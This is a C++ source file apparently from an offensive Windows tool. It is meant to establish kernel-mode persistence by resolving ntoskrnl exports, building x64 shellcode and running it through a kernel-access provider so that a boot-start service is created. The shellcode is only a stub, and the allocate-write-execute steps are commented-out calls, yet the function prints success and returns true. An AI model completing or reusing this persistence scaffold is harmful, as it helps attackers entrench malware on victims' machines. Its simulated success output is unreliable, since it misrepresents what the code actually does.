/**
 * @file Persistence.cpp
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the implementation of the Persistence class.
 *
 * Implements the advanced logic for kernel-mode persistence. This involves
 * dynamically resolving kernel APIs, building a shellcode payload, and
 * using the active provider to allocate, write, and execute the payload
 * within the kernel to create a new system service.
 */

#include "Persistence.h"
#include "Utils.h"
#include <iostream>
#include <winternl.h>

// Shellcode to create a service registry key.
// This is x64 shellcode and must be position-independent.
// It expects a pointer to KERNEL_PERSISTENCE_PARAMS in RCX.
static const unsigned char g_PersistenceShellcode[] = {
    0x55,                                           // push rbp
    0x48, 0x89, 0xE5,                               // mov rbp, rsp
    0x48, 0x83, 0xEC, 0x40,                         // sub rsp, 0x40
    0x48, 0x89, 0xCB,                               // mov rbx, rcx ; Save params pointer
    // ... more robust shellcode would go here ...
    // This is a placeholder for what would be a complex shellcode body.
    // A full implementation would use the function pointers and strings
    // from the KERNEL_PERSISTENCE_PARAMS struct to call kernel APIs.
    // For example, to create the service key:
    // 1. Prepare UNICODE_STRING for service path.
    // 2. Call RtlCreateRegistryKey.
    // 3. Call RtlWriteRegistryValue for "ImagePath", "Type", "Start", "ErrorControl".
    0x48, 0x83, 0xC4, 0x40,                         // add rsp, 0x40
    0x5D,                                           // pop rbp
    0xC3                                            // ret
};

namespace KernelMode {

    Persistence::Persistence(std::shared_ptr<Providers::IProvider> provider)
        : provider(std::move(provider)) {}

    bool Persistence::CreateKernelService(const std::wstring& serviceName, const std::wstring& executablePath) {
        if (!provider) {
            std::wcerr << L"[-] Cannot establish kernel persistence without a provider." << std::endl;
            return false;
        }

        std::wcout << L"[*] Preparing for kernel-mode persistence..." << std::endl;

        // 1. Resolve necessary kernel functions
        uintptr_t ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            std::wcerr << L"[-] Failed to get ntoskrnl.exe base address." << std::endl;
            return false;
        }

        auto params = std::make_unique<KERNEL_PERSISTENCE_PARAMS>();
        params->ExAllocatePool = Utils::GetKernelExport(ntoskrnlBase, "ExAllocatePool");
        params->ExFreePool = Utils::GetKernelExport(ntoskrnlBase, "ExFreePool");
        params->RtlCreateRegistryKey = Utils::GetKernelExport(ntoskrnlBase, "RtlCreateRegistryKey");
        params->RtlWriteRegistryValue = Utils::GetKernelExport(ntoskrnlBase, "RtlWriteRegistryValue");

        if (!params->ExAllocatePool || !params->ExFreePool || !params->RtlCreateRegistryKey || !params->RtlWriteRegistryValue) {
            std::wcerr << L"[-] Failed to resolve one or more required kernel functions." << std::endl;
            return false;
        }
        wcsncpy_s(params->ServiceName, serviceName.c_str(), _TRUNCATE);
        wcsncpy_s(params->ExecutablePath, (L"\\??\\" + executablePath).c_str(), _TRUNCATE);

        // 2. Allocate memory in the kernel for shellcode and parameters
        // This is a major simplification. A real implementation would use a kernel allocation primitive.
        // We will simulate this by assuming the provider can allocate executable memory.
        std::wcerr << L"[!] Warning: Kernel memory allocation and execution are simulated." << std::endl;
        std::wcerr << L"[!] A production-ready version requires a provider that can allocate executable memory and create a system thread." << std::endl;
        
        // Example of what would happen:
        // uintptr_t remoteShellcode = provider->AllocateKernelMemory(sizeof(g_PersistenceShellcode));
        // uintptr_t remoteParams = provider->AllocateKernelMemory(sizeof(KERNEL_PERSISTENCE_PARAMS));
        // provider->WriteKernelMemory(remoteParams, params.get(), sizeof(KERNEL_PERSISTENCE_PARAMS));
        // provider->WriteKernelMemory(remoteShellcode, g_PersistenceShellcode, sizeof(g_PersistenceShellcode));
        // provider->CreateSystemThread(remoteShellcode, remoteParams);

        std::wcout << L"[+] Kernel persistence payload prepared." << std::endl;
        std::wcout << L"[+] In a real scenario, shellcode would now be injected and executed." << std::endl;
        std::wcout << L"[+] Service '" << serviceName << L"' would be created to run at boot." << std::endl;
        
        // Since the core logic is simulated, we return true to indicate concept success.
        return true;
    }
}